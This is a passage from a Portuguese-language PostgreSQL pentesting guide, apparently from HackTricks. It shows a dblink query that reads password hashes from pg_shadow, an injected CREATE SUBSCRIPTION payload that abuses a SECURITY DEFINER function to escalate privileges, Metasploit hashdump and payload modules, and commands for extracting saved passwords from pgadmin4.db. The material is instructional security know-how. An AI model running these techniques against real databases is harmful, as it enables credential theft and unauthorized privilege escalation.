Observe que, para a consulta anterior funcionar, **a fun√ß√£o `dblink` precisa existir**. Se n√£o existir, voc√™ pode tentar cri√°-la com
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Se voc√™ tiver a senha de um usu√°rio com mais privil√©gios, mas o usu√°rio n√£o tiver permiss√£o para fazer login de um IP externo, voc√™ pode usar a seguinte fun√ß√£o para executar consultas como esse usu√°rio:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
√â poss√≠vel verificar se essa fun√ß√£o existe com:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Fun√ß√£o definida pelo usu√°rio com** SECURITY DEFINER

\*\*\*\*[**Neste artigo**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), os pentesters conseguiram elevar seus privil√©gios dentro de uma inst√¢ncia do postgres fornecida pela IBM, porque eles **encontraram essa fun√ß√£o com a flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Como [**explicado na documenta√ß√£o**](https://www.postgresql.org/docs/current/sql-createfunction.html), uma fun√ß√£o com **SECURITY DEFINER √© executada** com os privil√©gios do **usu√°rio que a possui**. Portanto, se a fun√ß√£o for **vulner√°vel a Inje√ß√£o de SQL** ou estiver realizando alguma **a√ß√£o privilegiada com par√¢metros controlados pelo atacante**, ela poder√° ser abusada para **elevar privil√©gios dentro do postgres**.

Na linha 4 do c√≥digo anterior, voc√™ pode ver que a fun√ß√£o possui a flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E ent√£o **execute comandos**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Passar Burteforce com PL/pgSQL

PL/pgSQL, como uma **linguagem de programa√ß√£o completa**, permite um controle procedural muito maior do que o SQL, incluindo a **capacidade de usar loops e outras estruturas de controle**. Declara√ß√µes SQL e gatilhos podem chamar fun√ß√µes criadas na linguagem PL/pgSQL.\
**Voc√™ pode abusar dessa linguagem para pedir ao PostgreSQL que fa√ßa for√ßa bruta nas credenciais dos usu√°rios.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registro

Dentro do arquivo _**postgresql.conf**_, voc√™ pode habilitar os registros do postgresql alterando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Em seguida, **reinicie o servi√ßo**.

### pgadmin

[pgadmin](https://www.pgadmin.org) √© uma plataforma de administra√ß√£o e desenvolvimento para o PostgreSQL.\
Voc√™ pode encontrar **senhas** dentro do arquivo _**pgadmin4.db**_.\
Voc√™ pode descriptograf√°-las usando a fun√ß√£o _**decrypt**_ dentro do script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

A autentica√ß√£o do cliente √© controlada por um arquivo de configura√ß√£o frequentemente chamado _**pg\_hba.conf**_. Este arquivo possui um conjunto de registros. Um registro pode ter um dos sete formatos a seguir:

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**Cada** registro **especifica** um **tipo de conex√£o**, um **intervalo de endere√ßos IP do cliente** (se relevante para o tipo de conex√£o), um **nome de banco de dados**, um **nome de usu√°rio** e o **m√©todo de autentica√ß√£o** a ser usado para conex√µes que correspondam a esses par√¢metros. O **primeiro registro com uma correspond√™ncia** de tipo de conex√£o, endere√ßo do cliente, banco de dados solicitado e nome de usu√°rio **√© usado** para realizar a autentica√ß√£o. N√£o h√° "fallback" ou "backup": **se um registro for escolhido e a autentica√ß√£o falhar, registros subsequentes n√£o ser√£o considerados**. Se nenhum registro corresponder, o acesso ser√° negado.\
Os m√©todos de autentica√ß√£o baseados em senha s√£o **md5**, **crypt** e **password**. Esses m√©todos operam de forma semelhante, exceto pela forma como a senha √© enviada pela conex√£o: respectivamente, com hash MD5, criptografada com crypt e em texto claro. Uma limita√ß√£o √© que o m√©todo crypt n√£o funciona com senhas que foram criptografadas em pg\_authid.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
